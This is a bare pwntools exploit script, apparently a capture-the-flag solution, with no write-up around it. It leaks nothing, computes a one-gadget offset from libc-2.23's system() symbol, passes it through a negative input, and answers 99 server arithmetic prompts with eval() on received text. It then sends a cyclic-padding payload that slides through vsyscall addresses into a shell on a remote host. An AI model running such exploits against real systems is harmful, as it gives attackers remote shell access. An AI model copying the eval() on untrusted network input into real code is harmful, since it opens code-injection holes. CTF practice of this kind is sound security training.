from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
#t = remote('192.168.5.179', 9999)

t = remote('111.198.29.45', 36728)

def answer():
    t.recvuntil('Question: ')
    #print t.recvuntil(' = ')[:-3]
    answer = eval(t.recvuntil(' = ')[:-3])
    t.sendline(str(answer))









libc = ELF('./libc-2.23.so')
offset_sys = libc.symbols['system']
magic = 0x4526a
vsyscall_gettimeofday = 0xffffffffff600000
#log.info('sys: ' + hex(libc_base))
t.sendlineafter('Choice:\n','2')
t.sendlineafter('Choice:\n','1')
t.sendlineafter('levels?\n','-1')
t.sendlineafter('more?\n',str(magic - offset_sys))
#log.info(str(magic - libc_base))
payload = cyclic(56) + p64(vsyscall_gettimeofday)*3
for i in range(99):
    log.info(i)
    answer()



raw_input()

t.sendafter('Answer:',payload)

t.interactive()
